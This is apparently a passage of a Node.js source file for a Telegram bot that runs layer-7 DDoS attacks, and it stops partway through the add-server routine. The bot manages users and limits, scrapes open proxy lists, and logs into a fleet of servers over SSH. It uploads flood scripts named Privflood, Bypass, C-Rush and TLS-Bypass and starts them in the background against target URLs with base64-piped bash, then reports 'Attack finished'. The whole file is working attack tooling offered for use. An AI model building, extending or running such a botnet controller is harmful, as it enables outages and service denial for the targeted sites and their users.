/**
 * PRIV L7 Bot v5 — Smart Defaults & Finish Notifications
 * 
 * Features:
 *  - Simplified commands: /attack crush <url> <time> auto-fills threads & rate
 *  - Finish notifications: Notifies chat when attack timer expires
 *  - Fixed SSH crash prevention (Unhandled 'error' event)
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn, exec } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const { Client } = require('ssh2');
const axios = require('axios');

/* ══════════════════════════ CONFIG ══════════════════════════ */

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),
  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  PROXY_FILE: 'proxy.txt',
  REMOTE_DIR: '/root/attack',
  SSH_TIMEOUT: 15000,
  HEALTH_CACHE_TTL: 30000,
  ATTACK_TIMEOUT: 25000,
};

if (!CONFIG.BOT_TOKEN) { console.error('BOT_TOKEN required.'); process.exit(1); }
if (CONFIG.ADMIN_IDS.length === 0) { console.error('ADMIN_ID required.'); process.exit(1); }

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const SERVERS_FILE = path.join(CONFIG.DATA_DIR, 'servers.json');
const METHODS_FILE = path.join(CONFIG.DATA_DIR, 'methods.json');
const BLACKLIST_FILE = path.join(CONFIG.DATA_DIR, 'blacklist.json');
const AUDIT_FILE = path.join(CONFIG.DATA_DIR, 'audit.log');

for (const [f, init] of [
  [USERS_FILE, '{}'], [SERVERS_FILE, '[]'], [METHODS_FILE, '[]'], [BLACKLIST_FILE, '[]'],
]) {
  if (!fs.existsSync(f)) fs.writeFileSync(f, init + '\n');
}

const NODE_BUILTINS = new Set([
  'http','https','http2','net','tls','fs','path','crypto','cluster',
  'zlib','stream','events','child_process','url','os','util','dns',
  'buffer','assert','querystring','perf_hooks','worker_threads','vm',
  'string_decoder','readline','repl','tty','v8','process','timers',
  'dgram','dns/promises','fs/promises','path/posix','path/win32',
  'constants','module','punycode','sys','trace_events','wasi',
]);

/* ══════════════════════════ STATE ══════════════════════════ */

const sessions = new Map();
const cooldowns = new Map();
const pendingInput = new Map();
const serverConns = new Map();
const healthCache = new Map();
const warmupInProgress = new Set();

/* ══════════════════════════ STORAGE ══════════════════════════ */

function readJSON(f, fb) { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return fb; } }
function writeJSON(f, d) {
  const tmp = f + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(d, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, f);
}
function audit(event, actor, details = {}) {
  try { fs.appendFileSync(AUDIT_FILE, JSON.stringify({ at: new Date().toISOString(), event, actor, details }) + '\n'); } catch {}
}

/* ══════════════════════════ USERS ══════════════════════════ */

function loadUsers() { return readJSON(USERS_FILE, {}); }
function saveUsers(u) { writeJSON(USERS_FILE, u); }
function getUser(id) { return loadUsers()[String(id)] || null; }

function upsertUser(id, patch) {
  const users = loadUsers();
  const key = String(id);
  users[key] = { ...(users[key] || {}), ...patch, updatedAt: new Date().toISOString() };
  saveUsers(users);
  return users[key];
}

function isAdmin(id) { return CONFIG.ADMIN_IDS.includes(id); }

function ensureUserExists(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;

  if (isAdmin(id)) {
    return upsertUser(id, {
      telegramId: id, username: msg.from.username || null,
      firstName: msg.from.first_name || null, role: 'admin',
      createdAt: new Date().toISOString(),
      limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
    });
  }

  return upsertUser(id, {
    telegramId: id, username: msg.from.username || null,
    firstName: msg.from.first_name || null, role: 'pending',
    createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
}

/* ══════════════════════════ BLACKLIST ══════════════════════════ */

function loadBlacklist() { return readJSON(BLACKLIST_FILE, []); }
function saveBlacklist(l) { writeJSON(BLACKLIST_FILE, l); }

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '').replace(/[/?#].*$/, '').replace(/:\d+$/, '').replace(/\.+$/, '');
}

function hostMatches(h, p) {
  h = normalizeHost(h); p = normalizeHost(p);
  if (!h || !p) return false;
  if (p.startsWith('*.')) { const b = p.slice(2); return h === b || h.endsWith('.' + b); }
  return h === p;
}

function isBlacklisted(host) { return loadBlacklist().some(p => hostMatches(host, p)); }

/* ══════════════════════════ METHODS ══════════════════════════ */

const BUILTIN_METHODS = [
  {
    id: 'priv', name: 'Privflood', file: 'priv.js', builtin: true,
    example: '/attack priv <url> <dur> [threads] [rate]',
    parse: (a) => {
      const [target, duration, threads = '16', rate = '90', ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('ddg')) b.push('-ddg');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'bypass', name: 'Bypass', file: 'bypass.js', builtin: true,
    example: '/attack bypass <GET|POST> <url> <dur> [threads] [rate]',
    parse: (a) => {
      const [method, target, duration, threads = '16', rate = '90', ...o] = a;
      const b = [method.toUpperCase(), target, duration, threads, rate, CONFIG.PROXY_FILE];
      o.forEach(x => {
        if (x.startsWith('query=')) b.push('--query', x.split('=')[1]);
        else if (x === 'limit') b.push('--limit', 'true');
        else if (x.startsWith('delay=')) b.push('--delay', x.split('=')[1]);
        else if (x === 'ios') b.push('--ios');
        else if (x === 'debug') b.push('--debug');
      });
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'crush', name: 'C-Rush', file: 'l.js', builtin: true,
    example: '/attack crush <url> <dur> [threads] [rate]',
    parse: (a) => {
      const [target, duration, threads = '16', rate = '90', ...f] = a;
      const b = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (f.includes('cookies')) b.push('-c');
      if (f.includes('headers')) b.push('-h');
      if (f.includes('cache')) b.push('-ch', 'true');
      return { target, duration, threads, rate, args: b };
    },
  },
  {
    id: 'tls', name: 'TLS-Bypass', file: 'tls.js', builtin: true,
    example: '/attack tls <url> <dur> [rate] [threads]',
    parse: (a) => {
      const [target, duration, rate = '90', threads = '16'] = a;
      return { target, duration, threads, rate, args: [target, duration, rate, threads, CONFIG.PROXY_FILE] };
    },
  },
];

function loadCustomMethods() { return readJSON(METHODS_FILE, []); }
function saveCustomMethods(l) { writeJSON(METHODS_FILE, l); }

function allMethods() {
  const custom = loadCustomMethods().map(m => ({
    id: m.id, name: m.name, file: m.file, builtin: false,
    template: m.template, example: m.example || `/attack ${m.id} <args...>`,
    parse: (a) => {
      let s = m.template;
      for (let i = a.length; i >= 1; i--) {
        s = s.split(`$${i}`).join(a[i - 1] ?? '');
      }
      s = s.split('{proxy}').join(CONFIG.PROXY_FILE);
      const arr = s.split(/\s+/).filter(Boolean);
      return { target: a[0], duration: a[1], threads: a[2] || '16', rate: a[3] || '90', args: arr };
    },
  }));
  return [...BUILTIN_METHODS, ...custom];
}

function getMethod(id) { return allMethods().find(m => m.id === id); }
function availableMethods() {
  return allMethods().filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
}

/* ══════════════════════════ DEPENDENCY SCANNER ══════════════════════════ */

function scanDependencies(filePath) {
  const content = fs.readFileSync(filePath, 'utf8');
  const reqs = new Set();
  const regex = /require\s*\(\s*['"]([^'"]+)['"]\s*\)/g;
  let match;
  while ((match = regex.exec(content)) !== null) {
    const mod = match[1];
    if (mod.startsWith('.') || mod.startsWith('/')) continue;
    if (mod.startsWith('node:')) continue;
    if (NODE_BUILTINS.has(mod)) continue;
    const pkgName = mod.startsWith('@')
      ? mod.split('/').slice(0, 2).join('/')
      : mod.split('/')[0];
    reqs.add(pkgName);
  }
  return [...reqs];
}

function isModuleInstalledLocally(pkg) {
  return fs.existsSync(path.join(CONFIG.SCRIPT_DIR, 'node_modules', pkg));
}

function installLocalDeps(deps) {
  return new Promise((resolve) => {
    if (deps.length === 0) return resolve({ ok: true, skipped: true });
    const missing = deps.filter(d => !isModuleInstalledLocally(d));
    if (missing.length === 0) return resolve({ ok: true, skipped: true, missing: [] });
    exec(
      `cd "${CONFIG.SCRIPT_DIR}" && npm install ${missing.join(' ')} --silent --no-audit --no-fund`,
      { timeout: 240000 },
      (err, stdout, stderr) => {
        if (err) resolve({ ok: false, missing, err: stderr || err.message });
        else resolve({ ok: true, missing });
      }
    );
  });
}

/* ══════════════════════════ TEMPLATE PARSER ══════════════════════════ */

const KEYWORD_FLAGS = {
  cookies: '-c',
  headers: '-h',
  cache: '-ch true',
  ddg: '-ddg',
  limit: '--limit true',
  ios: '--ios',
  debug: '--debug',
};

function parseSampleToTemplate(sample) {
  const tokens = sample.trim().split(/\s+/);
  const args = tokens.slice(1);
  const parts = [];
  const placeholders = [];
  let positionalCount = 0;

  for (const tok of args) {
    const lower = tok.toLowerCase();
    if (KEYWORD_FLAGS[lower]) {
      parts.push(KEYWORD_FLAGS[lower]);
      continue;
    }
    if (lower.startsWith('query=') || lower.startsWith('delay=')) {
      const [k, v] = lower.split('=');
      if (k === 'query') { parts.push(`--query $${++positionalCount}`); placeholders.push('query'); continue; }
      if (k === 'delay') { parts.push(`--delay $${++positionalCount}`); placeholders.push('delay'); continue; }
    }

    positionalCount++;
    parts.push(`$${positionalCount}`);
    if (positionalCount === 1) placeholders.push('url');
    else if (positionalCount === 2) placeholders.push('dur');
    else if (positionalCount === 3) placeholders.push('threads');
    else if (positionalCount === 4) placeholders.push('rate');
    else placeholders.push(`arg${positionalCount}`);
  }

  return { template: parts.join(' '), placeholders, positionalCount };
}

function templateToExample(methodId, template, placeholders) {
  const positions = {
    url: 'https://target.com', dur: '60', threads: '16', rate: '90', query: '1', delay: '10',
  };
  let s = template;
  placeholders.forEach((p, i) => {
    const val = positions[p] || `<${p}>`;
    s = s.split(`$${i + 1}`).join(val);
  });
  return `/attack ${methodId} ` + placeholders.map((p) => {
    if (p === 'url') return '<url>';
    if (p === 'dur') return '<dur>';
    if (p === 'threads') return '[threads]';
    if (p === 'rate') return '[rate]';
    if (p === 'query') return '[query]';
    if (p === 'delay') return '[delay]';
    return `<${p}>`;
  }).join(' ');
}

/* ══════════════════════════ SERVERS ══════════════════════════ */

function loadServers() { return readJSON(SERVERS_FILE, []); }
function saveServers(l) { writeJSON(SERVERS_FILE, l); }
function getServer(id) { return loadServers().find(s => s.id === id); }

function upsertServer(patch) {
  const list = loadServers();
  const idx = list.findIndex(s => s.id === patch.id);
  if (idx >= 0) list[idx] = { ...list[idx], ...patch };
  else list.push(patch);
  saveServers(list);
  return patch;
}

function removeServer(id) {
  const c = serverConns.get(id);
  if (c) { try { c.end(); } catch {} serverConns.delete(id); }
  healthCache.delete(id);
  saveServers(loadServers().filter(s => s.id !== id));
}

function newServerId() { return 'srv_' + crypto.randomBytes(3).toString('hex'); }

function serverStats() {
  const list = loadServers();
  const online = list.filter(s => s.status === 'online').length;
  const offline = list.length - online;
  const attacking = new Set(
    [...sessions.values()]
      .filter(s => s.status === 'running' && s.where === 'remote')
      .map(s => s.serverId)
  ).size;
  return { total: list.length, online, offline, attacking };
}

/* ══════════════════════════ SSH ══════════════════════════ */

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    let isSettled = false;

    const timer = setTimeout(() => {
      if (isSettled) return;
      isSettled = true;
      try { conn.end(); } catch {}
      reject(new Error('SSH timeout'));
    }, CONFIG.SSH_TIMEOUT);

    conn.on('ready', () => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      resolve(conn);
    });

    conn.on('error', (e) => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      try { conn.end(); } catch {}
      reject(e);
    });

    conn.on('error', () => {}); // Prevent crash

    try {
      conn.connect({
        host: server.host, port: server.port, username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        algorithms: { serverHostKey: ['ssh-rsa', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] },
      });
    } catch (e) {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timer);
      reject(e);
    }
  });
}

function sshExec(conn, cmd, timeoutMs = 120000) {
  return new Promise((resolve) => {
    let done = false;
    const timer = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'exec timeout' }); } }, timeoutMs);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(timer); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', errOut = '';
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { errOut += d.toString(); });
        stream.on('close', (code) => { clearTimeout(timer); done = true; resolve({ code: code || 0, out, err: errOut }); });
      });
    } catch (e) { clearTimeout(timer); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

function sshUpload(conn, local, remote) {
  return new Promise((resolve, reject) => {
    conn.sftp((err, sftp) => {
      if (err) return reject(err);
      sftp.fastPut(local, remote, (e) => {
        try { sftp.end(); } catch {}
        if (e) reject(e); else resolve();
      });
    });
  });
}

async function getServerConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) return c;
    serverConns.delete(id);
  }
  const server = getServer(id);
  if (!server) throw new Error('Server not found: ' + id);
  const conn = await sshConnect(server);
  conn._ready = true;
  conn.on('close', () => serverConns.delete(id));
  conn.on('error', () => serverConns.delete(id));
  serverConns.set(id, conn);
  return conn;
}

async function prewarmServers(serverIds) {
  const toWarm = serverIds.filter(id => !serverConns.has(id) && !warmupInProgress.has(id));
  if (toWarm.length === 0) return;
  toWarm.forEach(id => warmupInProgress.add(id));
  
  await Promise.allSettled(toWarm.map(async (id) => {
    try { await getServerConn(id); } catch (e) {}
    warmupInProgress.delete(id);
  }));
}

async function checkServerHealth(id, force = false) {
  const cached = healthCache.get(id);
  if (!force && cached && Date.now() - cached.at < CONFIG.HEALTH_CACHE_TTL) return cached;

  try {
    const conn = await getServerConn(id);
    const r = await sshExec(conn, 'echo ok; uptime', 10000);
    const online = r.out.includes('ok');
    const load = (r.out.match(/load average: ([^\n]+)/) || [])[1] || '?';
    const result = { online, load, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: online ? 'online' : 'offline', lastCheck: Date.now() });
    return result;
  } catch (e) {
    const result = { online: false, load: '?', error: e.message, at: Date.now() };
    healthCache.set(id, result);
    upsertServer({ id, status: 'offline', lastCheck: Date.now() });
    return result;
  }
}

/* ══════════════════════════ REMOTE SETUP ══════════════════════════ */

async function setupRemote(server, onProgress) {
  const conn = await sshConnect(server);
  try {
    onProgress && await onProgress('checking node...');
    const nodeCheck = await sshExec(conn, 'command -v node && node -v', 15000);

    if (nodeCheck.code !== 0 || !nodeCheck.out.trim()) {
      onProgress && await onProgress('installing node.js 20...');
      await sshExec(conn,
        'export DEBIAN_FRONTEND=noninteractive; ' +
        'curl -fsSL https://deb.nodesource.com/setup_20.x | bash - 2>&1 | tail -2; ' +
        'apt install -y nodejs build-essential 2>&1 | tail -3', 180000);
    }

    onProgress && await onProgress('creating folder...');
    await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);

    onProgress && await onProgress('uploading scripts...');
    for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
      const local = path.join(CONFIG.SCRIPT_DIR, f);
      if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
    }

    const proxyLocal = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
    if (fs.existsSync(proxyLocal)) {
      await sshUpload(conn, proxyLocal, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
    }

    for (const m of loadCustomMethods()) {
      const local = path.join(CONFIG.SCRIPT_DIR, m.file);
      if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${m.file}`);
    }

    onProgress && await onProgress('installing npm deps...');
    const deps = ['colors','hpack','node-bash-title','axios','header-generator','user-agents','fake-useragent'];
    await sshExec(conn,
      `cd ${CONFIG.REMOTE_DIR} && npm init -y > /dev/null 2>&1; npm install ${deps.join(' ')} --silent --no-audit --no-fund 2>&1 | tail -3`,
      240000);

    onProgress && await onProgress('done ✓');
    return { ok: true };
  } finally {
    try { conn.end(); } catch {}
  }
}

/* ══════════════════════════ ATTACK ══════════════════════════ */

function newSessionId() { return 'sess_' + crypto.randomBytes(3).toString('hex'); }

function userActiveSessions(id) {
  return [...sessions.values()].filter(s => s.owner === id && s.status === 'running').length;
}

function launchLocal(user, method, args, chatId) {
  const id = newSessionId();
  const methodPath = path.join(CONFIG.SCRIPT_DIR, method.file);
  if (!fs.existsSync(methodPath)) throw new Error(`File missing: ${method.file}`);

  const child = spawn(process.execPath, [methodPath, ...args], {
    cwd: CONFIG.SCRIPT_DIR, detached: true, stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' },
  });

  const session = {
    id, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'local', child, logs: '', chatId
  };

  child.stdout.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.stderr.on('data', d => { session.logs = (session.logs + d.toString()).slice(-3000); });
  child.on('exit', () => { session.status = 'done'; setTimeout(() => sessions.delete(id), 30000); });

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

async function launchRemote(user, method, args, serverId, chatId) {
  const server = getServer(serverId);
  if (!server) throw new Error('Server not found: ' + serverId);

  const conn = await getServerConn(serverId);

  const check = await sshExec(conn, `test -f ${CONFIG.REMOTE_DIR}/${method.file} && echo OK || echo MISSING`, 8000);
  if (!check.out.includes('OK')) {
    try {
      await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
      const local = path.join(CONFIG.SCRIPT_DIR, method.file);
      if (!fs.existsSync(local)) throw new Error(`local missing: ${method.file}`);
      await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${method.file}`);
    } catch (e) {
      throw new Error(`${server.name}: sync failed`);
    }
  }

  const id = newSessionId();
  const logFile = `/tmp/.atk_${id}.log`;

  const script = [
    `cd ${CONFIG.REMOTE_DIR} || exit 1`,
    `rm -f ${logFile}`,
    `nohup node ${method.file} ${args.join(' ')} < /dev/null > ${logFile} 2>&1 &`,
    `PID=$!`,
    `echo $PID`,
  ].join('\n');

  const b64 = Buffer.from(script).toString('base64');
  const cmd = `echo ${b64} | base64 -d | bash`;
  const r = await sshExec(conn, cmd, CONFIG.ATTACK_TIMEOUT);

  let remotePid = parseInt((r.out || '').trim().replace(/[^0-9]/g, ''), 10);

  if (!remotePid || isNaN(remotePid)) {
    const pg = await sshExec(conn, `pgrep -f "node ${method.file}" | head -1`, 8000);
    remotePid = parseInt((pg.out || '').trim().replace(/[^0-9]/g, ''), 10);
  }

  if (!remotePid || isNaN(remotePid)) {
    const tail = await sshExec(conn, `tail -3 ${logFile} 2>/dev/null || echo "no log"`, 6000);
    const errMsg = (tail.out || '').trim().slice(0, 100) || 'launch failed';
    throw new Error(`${server.name}: ${errMsg}`);
  }

  const alive = await sshExec(conn, `kill -0 ${remotePid} 2>/dev/null && echo ALIVE || echo DEAD`, 5000);
  if (!alive.out.includes('ALIVE')) {
    throw new Error(`${server.name}: died immediately`);
  }

  const session = {
    id, owner: user.telegramId, method: method.id, methodName: method.name,
    target: args[0] || '?', duration: Number(args[1]) || 0,
    startedAt: Date.now(), status: 'running', where: 'remote',
    serverId, serverName: server.name, remotePid, logFile, logs: '', chatId
  };

  session.timer = setTimeout(() => stopSession(id, 'duration_expired'), session.duration * 1000);
  session.timer.unref();
  sessions.set(id, session);
  return session;
}

function stopSession(id, reason = 'manual') {
  const s = sessions.get(id);
  if (!s || s.status !== 'running') return false;

  if (s.where === 'local' && s.child) {
    try { process.kill(-s.child.pid, 'SIGKILL'); } catch { try { s.child.kill('SIGKILL'); } catch {} }
  } else if (s.where === 'remote' && s.remotePid) {
    (async () => {
      try {
        const conn = await getServerConn(s.serverId);
        await sshExec(conn, `kill -9 ${s.remotePid} 2>/dev/null || true; pkill -9 -P ${s.remotePid} 2>/dev/null || true`, 8000);
      } catch {}
    })();
  }

  clearTimeout(s.timer);
  s.status = 'stopped';
  audit('attack_stopped', s.owner, { id, reason });

  // ✨ Finish notification
  if (reason === 'duration_expired' && s.chatId) {
    bot.sendMessage(s.chatId,
      `✅ <b>Attack finished</b>\n\n` +
      `Method: <b>${s.methodName}</b>\n` +
      `Target: <code>${s.target}</code>\n` +
      `Duration: ${s.duration}s`,
      { parse_mode: 'HTML' }
    ).catch(() => {});
  }

  return true;
}

function stopAllSessions(ownerFilter = null) {
  let killed = 0;
  for (const [id, s] of sessions.entries()) {
    if (s.status !== 'running') continue;
    if (ownerFilter && s.owner !== ownerFilter) continue;
    if (stopSession(id, 'killall')) killed++;
  }
  return killed;
}

/* ══════════════════════════ VALIDATION ══════════════════════════ */

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL invalid'); }
  if (url.protocol !== 'https:') throw new Error('must be https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

function checkLimits(user, d, th, r) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(d) > l.maxDuration) throw new Error(`duration max ${l.maxDuration}s`);
  if (l.maxThreads > 0 && Number(th) > l.maxThreads) throw new Error(`threads max ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(r) > l.maxRate) throw new Error(`rate max ${l.maxRate}`);
}

/* ══════════════════════════ PROXY ══════════════════════════ */

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set();
  for (const src of PROXY_SOURCES) {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      r.data.toString().split(/\r?\n/).forEach(l => {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      });
    } catch {}
  }
  const list = [...seen];
  fs.writeFileSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE), list.join('\n'));
  return list.length;
}

/* ══════════════════════════ BOT CORE ══════════════════════════ */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });

function esc(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'HTML', ...opts }); }
  catch { try { return await bot.sendMessage(msg.chat.id, text); } catch {} }
}

async function edit(chatId, messageId, text) {
  try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }); }
  catch {}
}

const COMMANDS = new Map();
function cmd(name, handler) { COMMANDS.set(name, handler); }

function adminOnly(msg) {
  if (!isAdmin(msg.from.id)) { reply(msg, '🚫 Admin only.'); return false; }
  return true;
}

cmd('start', async (msg) => {
  const user = ensureUserExists(msg);
  const stats = serverStats();
  const txt = [
    `🔥 <b>PRIV L7 HUB</b> 🔥`,
    ``,
    `📡 <b>${stats.online}/${stats.total}</b> online · <b>${stats.attacking}</b> attacking`,
    ``,
    `/attack — launch attack`,
    `/methods — attack methods`,
    `/servers — server status`,
    `/status — active sessions`,
    `/stop &lt;id&gt; — stop session`,
    `/scrape — refresh proxies`,
    `/help — full command list`,
  ];
  if (isAdmin(msg.from.id)) {
    txt.push('');
    txt.push('<b>Admin:</b>');
    txt.push('/users /approve /ban /adduser /setlimit /stats');
    txt.push('/blacklist /black /unblack');
    txt.push('/addmethod /delmethod');
    txt.push('/addserver /delserver /sync /syncall /refresh /killall');
  }
  await reply(msg, txt.join('\n'));
});

cmd('help', async (msg) => {
  ensureUserExists(msg);
  const s = serverStats();
  const txt = [
    `📡 <b>Servers:</b> ${s.online}/${s.total} online · ${s.attacking} attacking`,
    '',
    '<b>Commands:</b>',
    '/attack &lt;method&gt; &lt;args...&gt;',
    '/methods — attack methods',
    '/servers — server status',
    '/status — active sessions',
    '/stop &lt;id&gt;',
    '/scrape — refresh proxies',
  ];
  if (isAdmin(msg.from.id)) {
    txt.push('');
    txt.push('<b>Admin:</b>');
    txt.push('/users /approve /ban /adduser /setlimit /stats');
    txt.push('/blacklist /black /unblack');
    txt.push('/addmethod /delmethod');
    txt.push('/addserver /delserver /sync /syncall /refresh /killall');
  }
  await reply(msg, txt.join('\n'));
});

cmd('me', async (msg) => {
  const user = ensureUserExists(msg);
  const l = user.limits || {};
  const cd = cooldowns.get(msg.from.id);
  const cdLeft = cd && cd.until > Date.now() ? Math.ceil((cd.until - Date.now()) / 1000) : 0;
  await reply(msg, [
    `<b>Account</b>`,
    `ID: <code>${user.telegramId}</code>`,
    `Role: <b>${user.role}</b>`,
    '',
    '<b>Limits:</b>',
    `Duration: ${l.maxDuration || '∞'} · Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'} · Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    cdLeft > 0 ? `\n⏳ Cooldown: <b>${cdLeft}s</b>` : '',
  ].join('\n'));
});

cmd('methods', async (msg) => {
  const list = allMethods();
  const txt = ['<b>Attack methods:</b>', ''];
  list.forEach(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    txt.push(`${m.builtin ? '📦' : '🔧'} <b>${m.name}</b> ${ok ? '' : '❌'}`);
    txt.push(`  <code>${esc(m.example)}</code>`);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

cmd('servers', async (msg) => {
  const user = ensureUserExists(msg);
  const stats = serverStats();

  if (isAdmin(msg.from.id)) {
    const list = loadServers();
    const txt = [
      `<b>Servers (admin view)</b> — 🟢 ${stats.online} online · 🔴 ${stats.offline} offline · ⚔️ ${stats.attacking} attacking`,
      '',
    ];
    list.forEach(s => {
      const icon = s.status === 'online' ? '🟢' : s.status === 'offline' ? '🔴' : '⚪';
      const n = [...sessions.values()].filter(x => x.status === 'running' && x.serverId === s.id).length;
      const tag = n > 0 ? ` ⚔️×${n}` : '';
      txt.push(`${icon} <code>${s.id}</code> — <b>${esc(s.name)}</b>${tag}`);
      txt.push(`  <code>${esc(s.host)}:${s.port}</code> user=<code>${esc(s.username)}</code>`);
    });
    return reply(msg, txt.join('\n'));
  }

  await reply(msg,
    `📡 <b>Servers:</b> ${stats.online}/${stats.total} online · ${stats.attacking} attacking`
  );
});

cmd('refresh', async (msg) => {
  if (!adminOnly(msg)) return;
  const servers = loadServers();
  if (servers.length === 0) return reply(msg, '📭 No servers.');
  const sm = await reply(msg, `🔄 Re-checking ${servers.length} servers...`);
  let done = 0, online = 0;
  await Promise.all(servers.map(async (s) => {
    const r = await checkServerHealth(s.id, true);
    done++;
    if (r.online) online++;
    await edit(msg.chat.id, sm.message_id,
      `🔄 ${done}/${servers.length}\n🟢 ${online} · 🔴 ${done - online}`);
  }));
  await edit(msg.chat.id, sm.message_id,
    `✅ Done\n🟢 <b>${online}</b> online · 🔴 <b>${servers.length - online}</b> offline`);
});

cmd('addserver', async (msg, args) => {
  if (!adminOnly(msg)) return;
  if (args.length >= 3) {
    const [addr, username, ...rest] = args;
    const password = rest[0];
    const name = rest.slice(1).join(' ') || addr;
    return addServerFlow(msg, addr, username, password, name);
  }
  pendingInput.set(msg.from.id, { action: 'addserver_addr', data: {}, expires: Date.now() + 300000 });
  await reply(msg, '🔌 <b>Add Server</b>\n\nSend <code>IP:PORT</code>\n\n<i>/cancel to abort</i>');
});

async function addServerFlow(msg, addr, username, password, name) {
  const m = String(addr).match(/^([\d.]+|[\w.-]+):(\d+)$/);
  if (!m) return reply(msg, '❌ Format: <code>ip:port</code>');
  const [, host, portStr] = m;
  const port = parseInt(portStr, 10);
  if (!port || port < 1 || port > 65535) return reply(msg, '❌ Invalid port.');

  const id = newServerId();
  const sm = await reply(msg, '🔄 Testing SSH...');

  const server = { id, host, port, username, password, name, status: 'testing',
    addedBy: msg.from.id, addedAt: new Date().toISOString(), lastCheck: 0 };

  try { await sshConnect(server); }
  catch (e) { return edit(msg.chat.id, sm.message_id, `❌ SSH failed: <code>${esc(e.message.slice(0, 100))}</code>`); }

  server.status = 'setting_up';
  upsertServer(server);
  await edit(msg.chat.id, sm.message_id, '✅ SSH OK. Setting up...');

  try {
    await setupRemote(server, async (p) => edit(msg.chat.id, sm.message_id, `⚙️ ${p}`));
    upsertServer({ id, status: 'online', lastCheck: Date.now() });
